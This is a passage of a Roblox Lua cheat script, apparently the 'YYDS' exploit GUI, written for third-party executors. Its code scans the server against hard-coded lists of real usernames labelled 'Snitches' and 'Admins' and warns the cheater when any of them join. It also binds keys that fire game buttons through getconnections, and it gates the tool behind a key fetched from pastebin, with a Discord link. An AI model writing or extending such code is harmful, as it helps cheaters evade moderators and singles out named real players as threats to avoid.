	gui.Name = "YYDSNotification"
	gui.ResetOnSpawn = false
	gui.IgnoreGuiInset = true
	gui.Parent = pg
	local notif = Instance.new("Frame")
	notif.Size = UDim2.new(0, 220, 0, 62)
	notif.Position = UDim2.new(1, -230, 0, 48)
	notif.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
	notif.BackgroundTransparency = 0.2
	notif.Parent = gui
	local nc = Instance.new("UICorner") nc.CornerRadius = UDim.new(0, 6) nc.Parent = notif
	local bar = Instance.new("Frame")
	bar.Size = UDim2.new(0, 4, 1, 0)
	bar.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
	bar.Parent = notif
	local bc = Instance.new("UICorner") bc.CornerRadius = UDim.new(0, 2) bc.Parent = bar
	local label = Instance.new("TextLabel")
	label.Size = UDim2.new(1, -16, 1, 0)
	label.Position = UDim2.new(0, 12, 0, 0)
	label.BackgroundTransparency = 1
	label.Font = Enum.Font.GothamBold
	label.TextSize = 12
	label.TextWrapped = true
	label.TextXAlignment = Enum.TextXAlignment.Center
	label.TextYAlignment = Enum.TextYAlignment.Center
	label.RichText = true
	label.Parent = notif
	local line = (kind == "admin") and "Found: 1 Admins" or "Found: 1 Snitches"
	label.Text = "<font color='#FF5050'>🚨 DETECTED 🚨</font>" .. string.char(10) .. "<font color='#D8D8D8'>" .. line .. "</font>"
	task.delay(5, function()
	if gui then gui:Destroy() end
	end)
	end)
	end
	task.spawn(function()
	while runBtn.Parent do
	if autoOn and snitchPage.Visible then
	runStroke.Enabled = true
	runGrad.Rotation = (runGrad.Rotation + 6) % 360
	task.wait(0.03)
	else
	runStroke.Enabled = false
	task.wait(0.25)
	end
	end
	end)
	local function setScroll(on)
	if Page2Scroll then
	Page2Scroll.ScrollingEnabled = on
	end
	end
	snitch.MouseButton1Click:Connect(function()
	snitchPage.Visible = true
	setScroll(false)
	end)
	back.MouseButton1Click:Connect(function()
	snitchPage.Visible = false
	setScroll(true)
	end)
	runBtn.MouseButton1Click:Connect(function()
	if autoOn then
	if runBtn:GetAttribute("Wait") == true then
	runBtn:SetAttribute("Wait", false)
	autoOn = false
	paintRun()
	pcall(function()
	writefile("yyds_snitchrun_dev_v6.txt", "0")
	end)
	stopJoin()
	return
	end
	runBtn:SetAttribute("Wait", true)
	runBtn.Text = "Confirm 5"
	task.spawn(function()
	local i = 5
	while i > 0 do
	if runBtn:GetAttribute("Wait") ~= true then
	return
	end
	runBtn.Text = "Confirm " .. tostring(i)
	task.wait(1)
	i = i - 1
	end
	if runBtn:GetAttribute("Wait") == true then
	runBtn:SetAttribute("Wait", false)
	runBtn.Text = "Active"
	end
	end)
	return
	end
	autoOn = true
	runBtn:SetAttribute("Wait", false)
	paintRun()
	pcall(function()
	writefile("yyds_snitchrun_dev_v6.txt", "1")
	end)
	armJoin()
	local watchIds = {
	"keanrick","Mr_MidKnight12","xXBiennypremeXx","geno2352","Armuless","Dr_who2781","xmrroboto","elreylucho26","alexg4mes12","Alex52883","HECHESON","Suporter_C00lKidd213","ZOPsuh","Joofgiin_official","Leer_82","BoxAr03_07","RulingX2","eivisaltother","Jakesiren2013","GLM1014","WantedHitman_1","leo_go1863","CNight_1Shade","JohnCene2012","BoltsRB","pasta070","prisnor123467","ensjjjjbrother","jorgelsalvaje5","DavidHagibator","BonusGigachad","Eliasss16","soynessitopro","Nazahar2","Aki_Baddie","Sami346m","Michi_2208","Vaeitay","juston700","ovalsergito2","EEEispro1","Chamihunt456","Reset50325554","JCross0611","crisplymans","Cygferro2","yolomangjk","tupapiricooooooa","roblox_user_3845927828","TheRawStrawberry","anqlicvs","SouIeyy","Landoathug34","unknown_beatss","FireMeteorguy","iannflamingofan2","ChickenMcCrunch123","Breeqz","branmol","El_Darx","Ashpegz135","MaaD_x1","maxigodloki","roblox_user_10150856821","frainel2","heyimgael","camote485","efrenhf","Afgxkgaj","reefeyboy139","Faye_9753","Dw200534","lostyzr","MrZNuke","zwmbiec0","latadeservesa122","Cavalao_1111","dj7i8","fixerupe","felixi_gdw","Gianni_Silver","holdstillgihun456","thekiller_069","tigrina122","ANGEL1929ZORO","mrbonineprogamer","BxlletAnt"
	}
	local adminIds = { "Taraaaa_06", "MarvellousClint","Alaera","AmTheLastFloppaEver"}
	local want = {}
	for _, n in ipairs(watchIds) do
	want[string.lower(n)] = "watch"
	end
	for _, n in ipairs(adminIds) do
	want[string.lower(n)] = "admin"
	end
	local adminHits = {}
	local watchHits = {}
	for _, plr in ipairs(Players:GetPlayers()) do
	local kind = want[string.lower(plr.Name)]
	if kind == "admin" then
	table.insert(adminHits, plr.Name)
	elseif kind == "watch" then
	table.insert(watchHits, plr.Name)
	end
	end
	local lines = {}
	for _, n in ipairs(adminHits) do
	table.insert(lines, n)
	end
	for _, n in ipairs(watchHits) do
	table.insert(lines, n)
	end
	if boxText then
	if #lines == 0 then
	boxText.Text = "None"
	boxText.TextColor3 = Color3.fromRGB(160, 160, 160)
	else
	boxText.Text = table.concat(lines, "\n")
	boxText.TextColor3 = Color3.fromRGB(235, 235, 235)
	end
	end
	local pg = LocalPlayer:FindFirstChild("PlayerGui") or LocalPlayer:WaitForChild("PlayerGui")
	local oldN = pg:FindFirstChild("YYDSNotification")
	if oldN then
	oldN:Destroy()
	end
	local gui = Instance.new("ScreenGui")
	gui.Name = "YYDSNotification"
	gui.ResetOnSpawn = false
	gui.IgnoreGuiInset = true
	gui.Parent = pg
	local notifH = 42
	if #adminHits > 0 and #watchHits > 0 then
	notifH = 78
	elseif #adminHits > 0 or #watchHits > 0 then
	notifH = 62
	end
	local notif = Instance.new("Frame")
	notif.Size = UDim2.new(0, 220, 0, notifH)
	notif.Position = UDim2.new(1, -230, 0, 48)
	notif.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
	notif.BackgroundTransparency = 0.2
	notif.Parent = gui
	local nc = Instance.new("UICorner")
	nc.CornerRadius = UDim.new(0, 6)
	nc.Parent = notif
	local bar = Instance.new("Frame")
	bar.Size = UDim2.new(0, 4, 1, 0)
	bar.Parent = notif
	local bc = Instance.new("UICorner")
	bc.CornerRadius = UDim.new(0, 2)
	bc.Parent = bar
	local label = Instance.new("TextLabel")
	label.Size = UDim2.new(1, -16, 1, 0)
	label.Position = UDim2.new(0, 12, 0, 0)
	label.BackgroundTransparency = 1
	label.Font = Enum.Font.GothamBold
	label.TextSize = 12
	label.TextWrapped = true
	label.TextYAlignment = Enum.TextYAlignment.Center
	label.Parent = notif
	local safeCol = Color3.fromRGB(50, 205, 120)
	if #adminHits == 0 and #watchHits == 0 then
	bar.BackgroundColor3 = safeCol
	label.TextColor3 = safeCol
	label.TextXAlignment = Enum.TextXAlignment.Left
	label.Text = "Safe"
	else
	bar.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
	label.TextXAlignment = Enum.TextXAlignment.Center
	label.RichText = true
	local parts = {"<font color=\"#FF5050\">🚨 DETECTED 🚨</font>"}
	if #adminHits > 0 then
	table.insert(parts, "<font color=\"#D8D8D8\">Found: " .. tostring(#adminHits) .. " Admins</font>")
	end
	if #watchHits > 0 then
	table.insert(parts, "<font color=\"#D8D8D8\">Found: " .. tostring(#watchHits) .. " Snitches</font>")
	end
	label.Text = table.concat(parts, "\n")
	end
	task.spawn(function()
	task.wait(5)
	local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	local fadeOut = game:GetService("TweenService"):Create(notif, tweenInfo, {
	BackgroundTransparency = 1,
	Position = UDim2.new(1, 20, 0, 48)
	})
	local textFadeOut = game:GetService("TweenService"):Create(label, tweenInfo, { TextTransparency = 1 })
	local barFadeOut = game:GetService("TweenService"):Create(bar, tweenInfo, { BackgroundTransparency = 1 })
	fadeOut:Play()
	textFadeOut:Play()
	barFadeOut:Play()
	task.wait(0.5)
	if gui then
	gui:Destroy()
	end
	end)
	end)
	if autoOn then
	armJoin()
	task.defer(function()
	local watchIds = {"keanrick","Mr_MidKnight12","xXBiennypremeXx","geno2352","Armuless","Dr_who2781","xmrroboto","elreylucho26","alexg4mes12","Alex52883","HECHESON","Suporter_C00lKidd213","ZOPsuh","Joofgiin_official","Leer_82","BoxAr03_07","RulingX2","eivisaltother","Jakesiren2013","GLM1014","WantedHitman_1","leo_go1863","CNight_1Shade","JohnCene2012","BoltsRB","pasta070","prisnor123467","ensjjjjbrother","jorgelsalvaje5","DavidHagibator","BonusGigachad","Eliasss16","soynessitopro","Nazahar2","Aki_Baddie","Sami346m","Michi_2208","Vaeitay","juston700","ovalsergito2","EEEispro1","Chamihunt456","Reset50325554","JCross0611","crisplymans","Cygferro2","yolomangjk","tupapiricooooooa","roblox_user_3845927828","TheRawStrawberry","anqlicvs","SouIeyy","Landoathug34","unknown_beatss","FireMeteorguy","iannflamingofan2","ChickenMcCrunch123","Breeqz","branmol","El_Darx","Ashpegz135","MaaD_x1","maxigodloki","roblox_user_10150856821","frainel2","heyimgael","camote485","efrenhf","Afgxkgaj","reefeyboy139","Faye_9753","Dw200534","lostyzr","MrZNuke","zwmbiec0","latadeservesa122","Cavalao_1111","dj7i8","fixerupe","felixi_gdw","Gianni_Silver","holdstillgihun456","thekiller_069","tigrina122","ANGEL1929ZORO","mrbonineprogamer","BxlletAnt"}
	local adminIds = {"Taraaaa_06","MarvellousClint","Alaera","AmTheLastFloppaEver"}
	local want = {}
	for _, n in ipairs(watchIds) do want[string.lower(n)] = "watch" end
	for _, n in ipairs(adminIds) do want[string.lower(n)] = "admin" end
	local adminHits = {}
	local watchHits = {}
	for _, plr in ipairs(Players:GetPlayers()) do
	local kind = want[string.lower(plr.Name)]
	if kind == "admin" then table.insert(adminHits, plr.Name) elseif kind == "watch" then table.insert(watchHits, plr.Name) end
	end
	local lines = {}
	for _, n in ipairs(adminHits) do table.insert(lines, n) end
	for _, n in ipairs(watchHits) do table.insert(lines, n) end
	if boxText then
	if #lines == 0 then boxText.Text = "None" else boxText.Text = table.concat(lines, string.char(10)) end
	end
	local pg = LocalPlayer:FindFirstChild("PlayerGui") or LocalPlayer:WaitForChild("PlayerGui")
	local oldN = pg:FindFirstChild("YYDSNotification")
	if oldN then oldN:Destroy() end
	local gui = Instance.new("ScreenGui")
	gui.Name = "YYDSNotification"
	gui.ResetOnSpawn = false
	gui.IgnoreGuiInset = true
	gui.Parent = pg
	local notifH = 42
	if #adminHits > 0 and #watchHits > 0 then notifH = 78 elseif #adminHits > 0 or #watchHits > 0 then notifH = 62 end
	local notif = Instance.new("Frame")
	notif.Size = UDim2.new(0, 220, 0, notifH)
	notif.Position = UDim2.new(1, -230, 0, 48)
	notif.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
	notif.BackgroundTransparency = 0.2
	notif.Parent = gui
	local nc = Instance.new("UICorner") nc.CornerRadius = UDim.new(0, 6) nc.Parent = notif
	local bar = Instance.new("Frame") bar.Size = UDim2.new(0, 4, 1, 0) bar.Parent = notif
	local bc = Instance.new("UICorner") bc.CornerRadius = UDim.new(0, 2) bc.Parent = bar
	local label = Instance.new("TextLabel")
	label.Size = UDim2.new(1, -16, 1, 0)
	label.Position = UDim2.new(0, 12, 0, 0)
	label.BackgroundTransparency = 1
	label.Font = Enum.Font.GothamBold
	label.TextSize = 12
	label.TextWrapped = true
	label.TextYAlignment = Enum.TextYAlignment.Center
	label.Parent = notif
	local safeCol = Color3.fromRGB(50, 205, 120)
	if #adminHits == 0 and #watchHits == 0 then
	bar.BackgroundColor3 = safeCol
	label.TextColor3 = safeCol
	label.TextXAlignment = Enum.TextXAlignment.Left
	label.Text = "Safe"
	else
	bar.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
	label.TextXAlignment = Enum.TextXAlignment.Center
	label.RichText = true
	local parts = {"<font color='#FF5050'>🚨 DETECTED 🚨</font>"}
	if #adminHits > 0 then table.insert(parts, '<font color="#D8D8D8">Found: '..tostring(#adminHits)..' Admins</font>') end
	if #watchHits > 0 then table.insert(parts, '<font color="#D8D8D8">Found: '..tostring(#watchHits)..' Snitches</font>') end
	label.Text = table.concat(parts, string.char(10))
	end
	task.delay(5, function()
	if gui then gui:Destroy() end
	end)
	end)
	end
	end
	if not CustomLoopContainer or not Page1 or not Scroll then
	return
	end
	if LocalPlayer:GetAttribute("YYDSPC") == true then
	SimultaneousToggle.Size = UDim2.new(0, 16, 0, 16)
	SimultaneousToggle.Position = UDim2.new(0, 2, 0, 3)
	SimultaneousLabel.Size = UDim2.new(0, 28, 1, 0)
	SimultaneousLabel.Position = UDim2.new(0, 19, 0, 0)
	SimultaneousSubBtn.Position = UDim2.new(0, 46, 0, 3)
	SimultaneousInput.Size = UDim2.new(0, 22, 0, 16)
	SimultaneousInput.Position = UDim2.new(0, 63, 0, 3)
	SimultaneousAddBtn.Position = UDim2.new(0, 86, 0, 3)
	CustomToggle.Size = UDim2.new(0, 16, 0, 16)
	CustomToggle.Position = UDim2.new(0, 2, 0, 3)
	CustomLabel.Size = UDim2.new(0, 26, 1, 0)
	CustomLabel.Position = UDim2.new(0, 19, 0, 0)
	SubBtn.Position = UDim2.new(0, 46, 0, 3)
	CustomInput.Size = UDim2.new(0, 22, 0, 16)
	CustomInput.Position = UDim2.new(0, 63, 0, 3)
	AddBtn.Position = UDim2.new(0, 86, 0, 3)
	else
	SimultaneousToggle.Size = UDim2.new(0, 18, 0, 18)
	SimultaneousToggle.Position = UDim2.new(0, 5, 0, 2)
	SimultaneousLabel.Size = UDim2.new(0, 40, 1, 0)
	SimultaneousLabel.Position = UDim2.new(0, 28, 0, 0)
	SimultaneousSubBtn.Position = UDim2.new(0, 72, 0, 3)
	SimultaneousInput.Size = UDim2.new(0, 26, 0, 16)
	SimultaneousInput.Position = UDim2.new(0, 90, 0, 3)
	SimultaneousAddBtn.Position = UDim2.new(0, 118, 0, 3)
	CustomToggle.Size = UDim2.new(0, 18, 0, 18)
	CustomToggle.Position = UDim2.new(0, 5, 0, 2)
	CustomLabel.Size = UDim2.new(0, 40, 1, 0)
	CustomLabel.Position = UDim2.new(0, 28, 0, 0)
	SubBtn.Position = UDim2.new(0, 72, 0, 3)
	CustomInput.Size = UDim2.new(0, 26, 0, 16)
	CustomInput.Position = UDim2.new(0, 90, 0, 3)
	AddBtn.Position = UDim2.new(0, 118, 0, 3)
	end
	local oldBtn = CustomLoopContainer:FindFirstChild("ScanBindsBtn")
	if oldBtn then
	oldBtn:Destroy()
	end
	local oldPage = Page1:FindFirstChild("ScanBindPage")
	if oldPage then
	oldPage:Destroy()
	end
	local bindBtn = Instance.new("TextButton")
	bindBtn.Name = "ScanBindsBtn"
	bindBtn.Size = UDim2.new(0, 32, 0, 16)
	bindBtn.Position = UDim2.new(1, -40, 0, 3)
	bindBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 55)
	bindBtn.TextColor3 = Color3.fromRGB(230, 230, 230)
	bindBtn.Font = Enum.Font.GothamBold
	bindBtn.TextSize = 9
	bindBtn.Text = "Binds"
	bindBtn.Visible = (LocalPlayer:GetAttribute("YYDSPC") == true)
	bindBtn.Parent = CustomLoopContainer
	local bindBtnC = Instance.new("UICorner")
	bindBtnC.CornerRadius = UDim.new(0, 3)
	bindBtnC.Parent = bindBtn
	local page = Instance.new("Frame")
	page.Name = "ScanBindPage"
	page.Size = UDim2.new(1, -4, 1, -97)
	page.Position = UDim2.new(0, 2, 0, 95)
	page.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
	page.Visible = false
	page.ZIndex = 8
	page.Parent = Page1
	local pageC = Instance.new("UICorner")
	pageC.CornerRadius = UDim.new(0, 4)
	pageC.Parent = page
	local resetB = Instance.new("TextButton")
	resetB.Size = UDim2.new(0.5, -8, 0, 22)
	resetB.Position = UDim2.new(0, 5, 0, 4)
	resetB.BackgroundColor3 = Color3.fromRGB(90, 50, 50)
	resetB.TextColor3 = Color3.fromRGB(255, 255, 255)
	resetB.Font = Enum.Font.GothamBold
	resetB.TextSize = 11
	resetB.Text = "Reset"
	resetB.ZIndex = 9
	resetB.Parent = page
	local resetC = Instance.new("UICorner")
	resetC.CornerRadius = UDim.new(0, 4)
	resetC.Parent = resetB
	local saveB = Instance.new("TextButton")
	saveB.Size = UDim2.new(0.5, -8, 0, 22)
	saveB.Position = UDim2.new(0.5, 3, 0, 4)
	saveB.BackgroundColor3 = Color3.fromRGB(40, 90, 50)
	saveB.TextColor3 = Color3.fromRGB(255, 255, 255)
	saveB.Font = Enum.Font.GothamBold
	saveB.TextSize = 11
	saveB.Text = "Save"
	saveB.ZIndex = 9
	saveB.Parent = page
	local saveC = Instance.new("UICorner")
	saveC.CornerRadius = UDim.new(0, 4)
	saveC.Parent = saveB
	local list = Instance.new("ScrollingFrame")
	list.Name = "ScanBindList"
	list.Size = UDim2.new(1, -8, 1, -32)
	list.Position = UDim2.new(0, 4, 0, 30)
	list.BackgroundTransparency = 1
	list.BorderSizePixel = 0
	list.ScrollBarThickness = 5
	list.ScrollingEnabled = true
	list.AutomaticCanvasSize = Enum.AutomaticSize.Y
	list.CanvasSize = UDim2.new(0, 0, 0, 0)
	list.ZIndex = 9
	list.Parent = page
	local lay = Instance.new("UIListLayout")
	lay.SortOrder = Enum.SortOrder.LayoutOrder
	lay.Padding = UDim.new(0, 3)
	lay.Parent = list
	local function refreshBindList()
	for _, ch in ipairs(list:GetChildren()) do
	if ch:IsA("TextButton") or ch:IsA("Frame") or ch:IsA("TextLabel") then
	ch:Destroy()
	end
	end
	local pack = getgenv()._YYDSScanBinds
	if type(pack) ~= "table" then
	pack = {}
	end
	local groups = {}
	local order = {}
	for id, key in pairs(pack) do
	local ck, sk = string.match(tostring(id), "^(.-)|(.+)$")
	if ck and sk and key and key ~= "" then
	if not groups[ck] then
	groups[ck] = {}
	table.insert(order, ck)
	end
	table.insert(groups[ck], {sk, key, id})
	end
	end
	table.sort(order)
	local n = 0
	for _, ck in ipairs(order) do
	n = n + 1
	local cat = Instance.new("TextLabel")
	cat.Size = UDim2.new(1, -2, 0, 20)
	cat.BackgroundColor3 = Color3.fromRGB(45, 25, 70)
	cat.TextColor3 = Color3.fromRGB(240, 220, 255)
	cat.Font = Enum.Font.GothamBold
	cat.TextSize = 11
	cat.Text = "▸ " .. ck
	cat.ZIndex = 9
	cat.LayoutOrder = n
	cat.Parent = list
	local cc = Instance.new("UICorner")
	cc.CornerRadius = UDim.new(0, 4)
	cc.Parent = cat
	table.sort(groups[ck], function(a, b)
	return a[1] < b[1]
	end)
	for _, item in ipairs(groups[ck]) do
	n = n + 1
	local line = Instance.new("Frame")
	line.Size = UDim2.new(1, -2, 0, 22)
	line.BackgroundColor3 = Color3.fromRGB(32, 32, 32)
	line.ZIndex = 9
	line.LayoutOrder = n
	line.Parent = list
	local lc = Instance.new("UICorner")
	lc.CornerRadius = UDim.new(0, 4)
	lc.Parent = line
	local lab = Instance.new("TextLabel")
	lab.Size = UDim2.new(1, -54, 1, 0)
	lab.Position = UDim2.new(0, 4, 0, 0)
	lab.BackgroundTransparency = 1
	lab.Font = Enum.Font.Gotham
	lab.TextSize = 11
	lab.TextColor3 = Color3.fromRGB(230, 230, 230)
	lab.TextXAlignment = Enum.TextXAlignment.Left
	lab.Text = "⚡ " .. item[1]
	lab.ZIndex = 10
	lab.Parent = line
	local trash = Instance.new("TextButton")
	local edit = Instance.new("TextBox")
	edit.Size = UDim2.new(0, 20, 0, 18)
	edit.Position = UDim2.new(1, -44, 0, 2)
	edit.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
	edit.TextColor3 = Color3.fromRGB(255, 255, 255)
	edit.Font = Enum.Font.GothamBold
	edit.TextSize = 10
	edit.Text = tostring(item[2] or "")
	edit.ClearTextOnFocus = true
	edit.ZIndex = 10
	edit.Parent = line
	local ec = Instance.new("UICorner")
	ec.CornerRadius = UDim.new(0, 3)
	ec.Parent = edit
	edit:GetPropertyChangedSignal("Text"):Connect(function()
	local s = string.upper(tostring(edit.Text or ""))
	s = string.gsub(s, "[^A-Z0-9]", "")
	s = string.sub(s, 1, 1)
	if edit.Text ~= s then
	edit.Text = s
	end
	local packE = getgenv()._YYDSScanBinds
	if type(packE) ~= "table" then
	packE = {}
	getgenv()._YYDSScanBinds = packE
	end
	if s == "" then
	packE[item[3]] = nil
	else
	packE[item[3]] = s
	end
	for _, row in ipairs(Scroll:GetChildren()) do
	if row:IsA("TextButton") then
	local id2 = tostring(row:GetAttribute("ScanChar") or "") .. "|" .. tostring(row:GetAttribute("ScanSkill") or "")
	if id2 == item[3] then
	row:SetAttribute("ScanBind", s)
	local box = row:FindFirstChild("ScanBind")
	if box and box:IsA("TextBox") then
	box.Text = s
	end
	end
	end
	end
	if s ~= "" then
	edit:ReleaseFocus()
	end
	end)
	trash.Size = UDim2.new(0, 20, 0, 18)
	trash.Position = UDim2.new(1, -22, 0, 2)
	trash.BackgroundColor3 = Color3.fromRGB(70, 40, 40)
	trash.TextColor3 = Color3.fromRGB(255, 255, 255)
	trash.Font = Enum.Font.GothamBold
	trash.TextSize = 11
	trash.Text = "X"
	trash.ZIndex = 10
	trash.Parent = line
	local tc = Instance.new("UICorner")
	tc.CornerRadius = UDim.new(0, 3)
	tc.Parent = trash
	local id = item[3]
	trash.MouseButton1Click:Connect(function()
	local pack2 = getgenv()._YYDSScanBinds
	if type(pack2) == "table" then
	pack2[id] = nil
	end
	for _, row in ipairs(Scroll:GetChildren()) do
	if row:IsA("TextButton") and (tostring(row:GetAttribute("ScanChar") or "") .. "|" .. tostring(row:GetAttribute("ScanSkill") or "")) == id then
	row:SetAttribute("ScanBind", "")
	local box = row:FindFirstChild("ScanBind")
	if box and box:IsA("TextBox") then
	box.Text = ""
	end
	end
	end
	refreshBindList()
	end)
	end
	end
	list.CanvasSize = UDim2.new(0, 0, 0, math.max(n * 26 + 12, list.AbsoluteSize.Y + 1))
	end
	do
	local raw = ""
	pcall(function()
	if isfile and isfile("yyds_scanbind_dev_v4.txt") then
	raw = tostring(readfile("yyds_scanbind_dev_v4.txt") or "")
	end
	end)
	local pack = getgenv()._YYDSScanBinds
	if type(pack) ~= "table" then
	pack = {}
	end
	for line in string.gmatch(raw .. string.char(10), "(.-)" .. string.char(10)) do
	local ck, sk, k = string.match(line, "^(.-)|(.+)=([A-Z0-9])$")
	if ck and sk and k then
	pack[ck .. "|" .. sk] = k
	end
	end
	getgenv()._YYDSScanBinds = pack
	for _, row in ipairs(Scroll:GetChildren()) do
	if row:IsA("TextButton") then
	local ck = tostring(row:GetAttribute("ScanChar") or "")
	local sk = tostring(row:GetAttribute("ScanSkill") or "")
	local key = pack[ck .. "|" .. sk]
	if key then
	row:SetAttribute("ScanBind", key)
	local box = row:FindFirstChild("ScanBind")
	if box and box:IsA("TextBox") then
	box.Text = key
	end
	end
	end
	end
	end
	resetB.MouseButton1Click:Connect(function()
	if resetB:GetAttribute("Wait") == true then
	resetB:SetAttribute("Wait", false)
	getgenv()._YYDSScanBinds = {}
	pcall(function()
	writefile("yyds_scanbind_dev_v4.txt", "")
	end)
	for _, row in ipairs(Scroll:GetChildren()) do
	if row:IsA("TextButton") then
	row:SetAttribute("ScanBind", "")
	local box = row:FindFirstChild("ScanBind")
	if box and box:IsA("TextBox") then
	box.Text = ""
	end
	end
	end
	refreshBindList()
	resetB.Text = "Reset"
	return
	end
	resetB:SetAttribute("Wait", true)
	resetB.Text = "Confirm 5"
	task.spawn(function()
	local i = 5
	while i > 0 do
	if resetB:GetAttribute("Wait") ~= true then
	return
	end
	resetB.Text = "Confirm " .. tostring(i)
	task.wait(1)
	i = i - 1
	end
	if resetB:GetAttribute("Wait") == true then
	resetB:SetAttribute("Wait", false)
	resetB.Text = "Reset"
	end
	end)
	end)
	saveB.MouseButton1Click:Connect(function()
	local pack = getgenv()._YYDSScanBinds
	if type(pack) ~= "table" then
	return
	end
	local lines = {}
	for id, key in pairs(pack) do
	if key and key ~= "" then
	table.insert(lines, tostring(id) .. "=" .. tostring(key))
	end
	end
	table.sort(lines)
	pcall(function()
	writefile("yyds_scanbind_dev_v4.txt", table.concat(lines, string.char(10)))
	end)
	end)
	bindBtn.MouseButton1Click:Connect(function()
	if not page.Visible then
	local pack = getgenv()._YYDSScanBinds
	if type(pack) ~= "table" then
	pack = {}
	getgenv()._YYDSScanBinds = pack
	end
	for _, row in ipairs(Scroll:GetChildren()) do
	if row:IsA("TextButton") then
	local box = row:FindFirstChild("ScanBind")
	local key = ""
	if box and box:IsA("TextBox") then
	key = string.upper(tostring(box.Text or ""))
	key = string.gsub(key, "[^A-Z0-9]", "")
	key = string.sub(key, 1, 1)
	end
	if key == "" then
	key = tostring(row:GetAttribute("ScanBind") or "")
	end
	local ck = tostring(row:GetAttribute("ScanChar") or "")
	local sk = tostring(row:GetAttribute("ScanSkill") or "")
	if sk == "" then
	sk = string.gsub(tostring(row.Text or ""), "^⚡%s*", "")
	end
	if ck == "" then
	ck = "?"
	end
	if key ~= "" and sk ~= "" then
	pack[ck .. "|" .. sk] = key
	end
	end
	end
	refreshBindList()
	page.Visible = true
	Scroll.Visible = false
	bindBtn.Text = "Back"
	else
	page.Visible = false
	Scroll.Visible = true
	bindBtn.Text = "Binds"
	end
	end)
	UIS.InputBegan:Connect(function(input, gp)
	if gp then
	return
	end
	if LocalPlayer:GetAttribute("YYDSPC") ~= true then
	return
	end
	if input.UserInputType ~= Enum.UserInputType.Keyboard then
	return
	end
	local kn = string.upper(tostring(input.KeyCode.Name or ""))
	if kn == "" then
	return
	end
	local btn = nil
	for _, row in ipairs(Scroll:GetChildren()) do
	if row:IsA("TextButton") then
	local key = tostring(row:GetAttribute("ScanBind") or "")
	local box = row:FindFirstChild("ScanBind")
	if box and box:IsA("TextBox") then
	local t2 = string.upper(tostring(box.Text or ""))
	t2 = string.gsub(t2, "[^A-Z0-9]", "")
	t2 = string.sub(t2, 1, 1)
	if t2 ~= "" then
	key = t2
	end
	end
	if key == kn then
	btn = row
	break
	end
	end
	end
	if not btn then
	local pack = getgenv()._YYDSScanBinds
	if type(pack) == "table" then
	local hitId = nil
	for id, key in pairs(pack) do
	if key == kn then
	hitId = id
	break
	end
	end
	if hitId then
	for _, row in ipairs(Scroll:GetChildren()) do
	if row:IsA("TextButton") then
	local id2 = tostring(row:GetAttribute("ScanChar") or "") .. "|" .. tostring(row:GetAttribute("ScanSkill") or "")
	if id2 == hitId then
	btn = row
	break
	end
	end
	end
	end
	end
	end
	if not btn then
	return
	end
	pcall(function()
	if getconnections then
	for _, conn in ipairs(getconnections(btn.MouseButton1Click)) do
	if conn.Fire then
	conn:Fire()
	break
	end
	end
	end
	end)
	end)
	end
end)
task.spawn(function()
	do
	-- Key lock (inside existing spawn)
	local PASTE_URL = "https://pastebin.com/raw/ZFpgYThg"
	local KEY_FILE = "YYDS_Key_" .. LocalPlayer.UserId
	local DC_LINK = "https://discord.gg/uvFEsP6g3y"
	local keyUnlocked = false
	pcall(function()
	if isfile and isfile(KEY_FILE) then keyUnlocked = true end
	end)
	local function getPasteKey()
	local ok, res = pcall(function()
	if request then
	local r = request({Url = PASTE_URL, Method = "GET"})
	return r and r.Body
	end
	return game:HttpGet(PASTE_URL)
	end)
	if ok and res then return (res:gsub("%s+", "")):upper() end
	return nil
	end
	local keyPopup = nil
	local function showKeyPopup()
	if keyPopup and keyPopup.Parent then return end
	local pg = LocalPlayer:WaitForChild("PlayerGui")
	local gui = Instance.new("ScreenGui")
	gui.Name = "YYDSKeyPopup"
	gui.ResetOnSpawn = false
	gui.DisplayOrder = 100
	gui.Parent = pg
	keyPopup = gui
	local bg = Instance.new("Frame")
	bg.Size = UDim2.new(1,0,1,0)
	bg.BackgroundColor3 = Color3.fromRGB(0,0,0)
	bg.BackgroundTransparency = 0.4
	bg.Parent = gui
	local f = Instance.new("Frame")
	f.Size = UDim2.new(0,280,0,180)
	f.Position = UDim2.new(0.5,-140,0.5,-90)
	f.BackgroundColor3 = Color3.fromRGB(22,22,26)
	f.Parent = bg
	Instance.new("UICorner", f).CornerRadius = UDim.new(0,8)
	local box = Instance.new("TextBox")
	box.Size = UDim2.new(1,-16,0,32)
	box.Position = UDim2.new(0,8,0,40)
	box.BackgroundColor3 = Color3.fromRGB(32,32,36)
	box.TextColor3 = Color3.fromRGB(255,255,255)
	box.Font = Enum.Font.Gotham
	box.TextSize = 13
	box.PlaceholderText = "Key"
	box.Text = ""
	box.Parent = f
	Instance.new("UICorner", box).CornerRadius = UDim.new(0,4)
	local btn = Instance.new("TextButton")
	btn.Size = UDim2.new(1,-16,0,30)
	btn.Position = UDim2.new(0,8,0,80)
	btn.BackgroundColor3 = Color3.fromRGB(40,120,60)
	btn.TextColor3 = Color3.fromRGB(255,255,255)
	btn.Font = Enum.Font.GothamBold
	btn.TextSize = 13
	btn.Text = "Confirm"
	btn.Parent = f
	Instance.new("UICorner", btn).CornerRadius = UDim.new(0,4)
	local dc = Instance.new("TextButton")
	dc.Size = UDim2.new(1,-16,0,22)
	dc.Position = UDim2.new(0,8,0,118)
	dc.BackgroundTransparency = 1
	dc.TextColor3 = Color3.fromRGB(100,160,255)
	dc.Font = Enum.Font.Gotham
	dc.TextSize = 11
	dc.Text = DC_LINK
	dc.Parent = f
	dc.MouseButton1Click:Connect(function()
	pcall(function() if setclipboard then setclipboard(DC_LINK) end end)
	end)
	local status = Instance.new("TextLabel")
	status.Size = UDim2.new(1,-16,0,18)
	status.Position = UDim2.new(0,8,0,144)
	status.BackgroundTransparency = 1
	status.Font = Enum.Font.Gotham
	status.TextSize = 11
	status.Text = ""
	status.Parent = f
	btn.MouseButton1Click:Connect(function()
	local input = (box.Text or ""):gsub("%s+",""):upper()
	if input == "" then status.Text = "Enter a key" status.TextColor3 = Color3.fromRGB(255,80,80) return end
	status.Text = "Checking..."
	local real = getPasteKey()
